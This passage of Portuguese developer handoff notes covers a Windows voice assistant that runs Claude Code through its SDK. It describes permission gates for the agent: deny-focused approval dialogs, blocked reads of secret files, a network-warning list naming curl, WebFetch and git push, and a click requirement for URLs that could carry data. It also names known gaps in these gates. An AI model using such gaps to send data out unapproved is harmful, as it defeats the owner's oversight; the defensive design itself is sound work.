resposta fora do formato, tudo é protegido); o "piso interno" foi removido. **Decisão consciente:** a C protege "dentro de repositório", então o Claude do painel NÃO edita código de projetos (isso é no VS Code); o painel é para manutenção do PC. `propor_acao`/`status_aprovacao` falam só com a `Fachada` (`analisar`/`status`); o Motor fica em `Motor.aprovacao` (dervs_electron) e nasce só na primeira proposta; o clique de aprovação e a execução ficam para a onda D. O `claude_propostas.jsonl` sumiu: o log é o `acoes.jsonl` encadeado e redigido da C. (4) Read/Grep/Glob/LS negados em caminho de `_SEGREDOS` e em pasta de `caminhos_protegidos.json` (dado de paciente), em qualquer perfil (a lista ilegível fecha a leitura). (5) Menores: Permitir só habilita 700 ms depois de cada abertura (Negar sempre pronto e com foco); aviso próprio de "rede" (WebFetch, MCP de rede, curl, git push...); PID do `claude` guardado (SDK ou filho novo do processo, com hora de criação) como fallback quando `_transport._process` sumir. **Pendência da onda E:** com `setting_sources` do dono e `cwd` = pasta do DERVS a sessão do painel carrega os hooks de desenvolvimento do dono (ex.: `handoff-inbox` consome recado da janela). Não desliguei com `disableAllHooks` porque não provei que ele poupa o gancho em processo do SDK; a solução é o `cwd` do harness (onda E) e/ou um settings próprio da sessão.
**29/09 - onda B (Claude Code real) implementada:** (1) `_Sessao._ler_resultado` agora usa thread leitora + `queue.Queue` (o `select` dava WinError 10038 no Windows e o streaming nunca funcionou aqui); `claude` resolvido por `shutil.which` (o `.cmd` do npm vira o `.exe` nativo, porque o cmd.exe reinterpreta o prompt); cano UTF-8. (2) `dervs_claude_code.py` com `claude-agent-sdk==0.2.161`: modo `default` como constante, gancho `PreToolUse`, `can_use_tool` -> painel (5 min nega; voz nunca aprova `muda_estado`), servidor MCP `dervs`, sessão contínua + resume, interrupt + `encerrar_arvore` após 5 s, custo em `gasto.jsonl` como "assinatura (equivalente)" (fora do total do dia). (3) verbos `claude_*` na ponte, `main.js`, `preload.js` e painel (diálogo com foco em Negar, Markdown mínimo sem `innerHTML`). (4) voz "pede pro Claude…/analisa…/verifica meu PC" e "para". (5) config `claude_perfil` (`dono`|`equipe`, padrão `dono`; `cerebro` não mudou). Provado com pergunta REAL ao `claude` 2.1.284: resposta "OK", 2º turno no mesmo processo em 1,9 s, retomada em processo novo lembrou a palavra. **Pendências deixadas de propósito:** (a) [RESOLVIDO na correção da revisão, abaixo]; (b) `central_coletar` é stub até a onda D; (c) [RESOLVIDO: `propor_acao` usa a Fachada da onda C]; (d) `cwd` da sessão é a pasta do DERVS até existir a pasta do harness (onda E); (e) a 1ª pergunta carrega o `~/.claude` do dono (≈ US$ 0,12-0,25 equivalentes de assinatura), as seguintes ≈ US$ 0,01.

### 4.4. Não há CI

Não existe verificação automática no GitHub: se alguém quebrar algo, ninguém é
avisado até rodar os testes na mão. **Não instalei de propósito** — o Actions
do GitHub é pago por minuto e a sua cota já estourou uma vez. É uma decisão de
dinheiro, e é sua. Se quiser, monto no padrão barato (roda pouco no `push`, o
caro só antes de publicar).

### 4.5. ~~Telemetria do porteiro~~ — FEITO em 23/09/2026 (`porteiro.jsonl`; texto só se `porteiro_registrar_texto`)

*(Histórico:)*

Quando o porteiro decide "não era comigo", o texto que ele ouviu é jogado fora
e o arquivo apagado. Consequência: se uma frase sua for ignorada por engano,
**não há como provar onde ela sumiu**. Vale guardar um resumo (sem o áudio) para
poder investigar.

### 4.6. ~~Três ajudantes sem teste próprio~~ — FEITO em 23/09/2026 (23 testes em `test_dervs_daemons_de_voz.py`)

*(Histórico:)*

`dervs_kokoro_daemon.py`, `dervs_piper_daemon.py` e `dervs_tts_daemon.py` não
têm teste dedicado. Eles são exercitados de raspão pelos testes da voz, mas uma
quebra dentro deles não seria pega.

### 4.7. ~~Peso morto que sobrou da versão de Linux~~ — REMOVIDO em 23/09/2026

*(Histórico; o caminho do `arecord` continua, é reserva intencional.)*

- `dervs_painel.py` — arquivo inteiro, do projeto irmão de Linux. Ninguém no
  Windows o importa. Deixei no lugar: apagar é irreversível e ele não atrapalha.
- `falar.sh` e `ligar-voz-com-senha.sh` — scripts de Linux, na raiz, sem uso
  aqui.
- O caminho do `arecord` (gravação por Linux) dentro do microfone: é reserva
  intencional, não sobra esquecida — está testado como tal.

### 4.8. Uma escolha de segurança que vale você saber

Ao fechar o buraco do "abrir endereço com dados dentro", tive de escolher onde
traçar a linha:

- `chrome https://google.com` continua **manso** — é uso diário seu, e cartão
  vermelho à toa treina você a clicar "sim" sem ler, o que estraga o "sim" que
  importa;
- endereço com `?` ou `#` (que é onde dados caberiam) passa a **pedir um
  clique**.

**Custo dessa escolha, dito com todas as letras:** uma busca montada como
`google.com/search?q=gatos` passa a pedir um clique a mais, e um endereço que
esconda dados no caminho (sem `?`) ainda escapa. Se você achar incômodo, dá
para afrouxar.

### 4.9. PRÓXIMA GRANDE ETAPA — pedido do dono em 28/09/2026 (ainda sem esteira aberta)

Palavras dele: "quero a aplicação funcionando e finalizada", "quero o painel ultra
revolucionário e muito inteligente", "quero que meu pc sempre esteja sem erros e
atualizado". Abrir esteira nova (slug sugerido `dervs-central-do-pc`) pela fase 1
(briefing). O pedido, sem edição de escopo:

1. **Um painel só.** Hoje há dois (widget 420x700 + painel grande). Ele quer **só o
   grande**. Tem de poder **minimizar/diminuir e fechar**, e ficar **na bandeja do
   Windows ou de fácil acesso** (ícone de bandeja com menu, atalho, ícone na barra).
2. **Usar o Claude Code de verdade — "exatamente igual ao que estamos usando, o mesmo
   Claude".** O DERVS deve dirigir o mesmo `claude` (CLI/Agent SDK) que ele usa no
   VS Code: mesmas configurações (`~/.claude`), mesmos MCPs, mesmas skills. O campo
   `cerebro` da config já aceita `"claude"` (hoje o padrão é `openai`/gpt-4.1-mini).
   **Terminal embutido no app** se pertinente (ideia: xterm.js + node-pty, ou saída
   em streaming do `claude -p --output-format stream-json`).
3. **MCPs no app**, por exemplo o **Playwright** para abrir navegador e clicar em tudo.
4. **Acesso à máquina inteira** para analisar e corrigir tudo — com trava: ação
   destrutiva/irreversível continua pedindo clique (ver `dervs_safety.py`).
5. **Central do PC no painel:** manutenção, análises, saúde, melhorias, atualizações.
   Ideias já levantadas: saúde do disco (SMART/espaço/temperatura), atualizações
   (Windows Update e `winget upgrade`), erros recentes do Visualizador de Eventos,
   programas na inicialização e processos que pesam, limpeza segura de temporários,
   Defender e firewall, backup (o que não está no GitHub), drivers, bateria/energia,
   e um "diagnóstico do dia" por voz. Meta: **PC sempre sem erros e atualizado**.

**Perguntas de produto a fazer na fase 1 (com recomendação):** quanto de autonomia
(só sugerir / corrigir sozinho o reversível / tudo com clique); Claude pela assinatura
do dono ou por chave de API (custo); e se corrigir sozinho roda em horário fixo.

**Risco alto** (acesso à máquina toda + comando por voz): o portão de risco da esteira
vale — leia `dervs_safety.py` e o §3.4 antes de propor qualquer atalho.

---

## 5. Como refazer o ambiente numa máquina limpa

Isto não existia até hoje — a receita vivia só dentro da pasta `dervs-venv`
desta máquina. Agora está em `requirements.txt`:

```
python -m venv dervs-venv
dervs-venv\Scripts\python.exe -m pip install -r requirements.txt
cd electron && npm install && cd ..
# se electron\node_modules\electron\dist não existir depois do npm install:
#   node electron\node_modules\electron\install.js
dervs-venv\Scripts\python.exe scripts\instalar_atalho.py
```

O passo `npm install` é novo (16/09/2026, com a tela Electron): baixa o
Electron (~150–300 MB), precisa de internet, e sem ele `dervs_electron.py` não
abre.

Fica de fora, e precisa ser baixado à parte: o modelo da voz (`kokoro-model/`,
~350 MB) e a chave da OpenAI (que mora em `%APPDATA%\dervs\.env` e **nunca** vai
para o repositório).
